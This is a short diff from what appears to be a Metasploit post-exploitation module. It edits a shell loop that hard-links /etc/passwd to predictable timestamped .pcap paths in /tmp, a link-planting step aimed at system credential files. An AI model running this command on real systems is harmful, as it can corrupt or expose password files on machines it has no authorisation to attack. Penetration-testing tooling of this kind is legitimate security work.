@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Post
 		while(true) do
 			if (i == 60)
 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
-				cmd_exec("for i in $(seq 0 120); do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
+				cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
 				i = 0
 			end
 			i = i+1
